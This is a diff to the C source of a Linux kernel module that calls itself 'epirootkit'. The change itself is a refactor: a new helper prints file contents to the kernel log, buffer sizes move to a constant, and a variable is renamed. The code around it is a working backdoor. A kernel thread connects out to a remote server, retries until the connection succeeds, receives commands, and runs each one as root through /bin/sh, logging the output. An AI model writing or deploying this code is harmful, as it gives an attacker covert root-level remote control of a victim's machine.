@@ -79,6 +79,62 @@ static int cleanup(void)
 	return SUCCESS;
 }
 
+enum text_level {
+	INFO,
+	WARN,
+	ERR,
+	CRIT,
+};
+
+static int print_file_content(char *filename, enum text_level level)
+{
+	struct file *file = NULL;
+	// Open the file for reading
+	file = filp_open(filename, O_RDONLY, 0);
+	if (IS_ERR(file)) {
+		pr_err("epirootkit: print_file_content: failed to open file %s\n", filename);
+		return -ENOENT;
+	}
+
+	char *buf = NULL;
+	loff_t pos = 0;
+	int len = 0;
+
+	// Allocate memory for the buffer
+	buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
+	if (!buf)
+		return -ENOMEM;
+
+	// Read the file content into the buffer
+	len = kernel_read(file, buf, STD_BUFFER_SIZE - 1, &pos);
+	if (len < 0) {
+		kfree(buf);
+		return len;
+	}
+
+	buf[len] = '\0'; // Null-terminate the string
+
+	// Print the content based on the specified log level
+	switch (level) {
+	case WARN:
+		pr_warn("%s", buf);
+		break;
+	case ERR:
+		pr_err("%s", buf);
+		break;
+	case CRIT:
+		pr_crit("%s", buf);
+		break;
+	default:
+		pr_info("%s", buf);
+		break;
+	}
+
+	kfree(buf);
+	filp_close(file, NULL);
+	return SUCCESS;
+}
+
 /**
  * @brief Executes a command string in user mode.
  * 
@@ -88,22 +144,19 @@ static int cleanup(void)
 static int exec_str_as_command(char *user_cmd)
 {
 	struct subprocess_info *sub_info = NULL;							// Structure used to spawn a userspace process
-	struct file *file = NULL;				 	 	 	 	 	 	  	// File pointer to read the output of the command
 	char *cmd = NULL;
 	char *argv[] = { "/bin/sh", "-c", NULL, NULL };
 	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 	char *output_file = "/tmp/kernel_exec_output";
-	char *buf = NULL;
-	loff_t pos = 0;														// File read position
-	int status = 0, len = 0;											// Return code and number of bytes read
+	int status = 0;														// Return code and number of bytes read
 
 	// Allocate memory for the command string
-	cmd = kmalloc(4096, GFP_KERNEL);
+	cmd = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
 	if (!cmd)
 		return -ENOMEM;
 
 	// Construct the full shell command with output redirection
-	snprintf(cmd, 4096, "%s > %s 2>&1", user_cmd, output_file);
+	snprintf(cmd, STD_BUFFER_SIZE, "%s > %s 2>&1", user_cmd, output_file);
 	argv[2] = cmd;
 
 	pr_info("epirootkit: exec_str_as_command: executing command: %s\n", cmd);
@@ -119,31 +172,10 @@ static int exec_str_as_command(char *user_cmd)
 	status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
 	pr_info("epirootkit: exec_str_as_command: command exited with status: %d\n", status);
 
-	// Read the output from the file and print it
-	file = filp_open(output_file, O_RDONLY, 0);
-	if (IS_ERR(file)) {
-		kfree(cmd);
-		return -ENOENT;
-	}
+	// Print the output of the command
+	print_file_content(output_file, INFO);
 
-	// Allocate a buffer to store the file content
-	buf = kmalloc(4096, GFP_KERNEL);
-	if (!buf) {
-		filp_close(file, NULL);
-		kfree(cmd);
-		return -ENOMEM;
-	}
-
-	// Read from the file into the buffer
-	len = kernel_read(file, buf, 4096 - 1, &pos);
-	if (len >= 0) {
-		buf[len] = '\0';
-		pr_info("epirootkit: exec_str_as_command: command output:\n%s", buf);
-	}
-
-	// Cleanup: free memory and close file
-	kfree(buf);
-	filp_close(file, NULL);
+	// Cleanup: free memory
 	kfree(cmd);
 	return SUCCESS;
 }
@@ -172,9 +204,9 @@ static int network_worker(void *data)
 	}
 
 	// Create a TCP socket in kernel space
-	ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
-	if (ret < 0) {
-		pr_err("epirootkit: network_worker: socket creation failed: %d\n", ret);
+	ret_code = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
+	if (ret_code < 0) {
+		pr_err("epirootkit: network_worker: socket creation failed: %d\n", ret_code);
 		return FAILURE;
 	}
 
@@ -186,9 +218,9 @@ static int network_worker(void *data)
 	// Attempt to connect to the remote server
 	// Retry periodically until the thread is stopped or the connection succeeds
 	while (!kthread_should_stop()) {
-		ret = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
-		if (ret < 0) {
-			pr_err("epirootkit: network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret);
+		ret_code = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
+		if (ret_code < 0) {
+			pr_err("epirootkit: network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret_code);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			continue;
 		}
@@ -203,16 +235,16 @@ static int network_worker(void *data)
 	// Attempt to send the initial message
 	int attempts = 0;
 	do {
-		ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-		if (ret < 0) {
-			pr_err("epirootkit: network_worker: failed to send message: %d, retrying... (attempt %d/%d)\n", ret, attempts + 1, MAX_SENDING_MSG_ATTEMPTS);
+		ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+		if (ret_code < 0) {
+			pr_err("epirootkit: network_worker: failed to send message: %d, retrying... (attempt %d/%d)\n", ret_code, attempts + 1, MAX_SENDING_MSG_ATTEMPTS);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			attempts++;
 		}
 	} while (ret_code < 0 && attempts < MAX_SENDING_MSG_ATTEMPTS);
 
 	// If all attempts to send the message failed, abort
-	if (ret < 0) {
+	if (ret_code < 0) {
 		pr_err("epirootkit: network_worker: failed to send message after 10 attempts, giving up.\n");
 		return FAILURE;
 	}
@@ -230,15 +262,15 @@ static int network_worker(void *data)
 		recv_vec.iov_len = sizeof(recv_buffer) - 1;
 
 		// Wait to receive a message from the server
-		ret = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
-		if (ret < 0) {
-			pr_err("epirootkit: network_worker: error receiving message: %d\n", ret);
+		ret_code = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
+		if (ret_code < 0) {
+			pr_err("epirootkit: network_worker: error receiving message: %d\n", ret_code);
 			msleep(TIMEOUT_BEFORE_RETRY);
 			continue;
 		}
 
 		// Null-terminate the received message
-		recv_buffer[ret] = '\0';
+		recv_buffer[ret_code] = '\0';
 		pr_info("epirootkit: network_worker: received: %s", recv_buffer);
 
 		// Parse and handle the received command
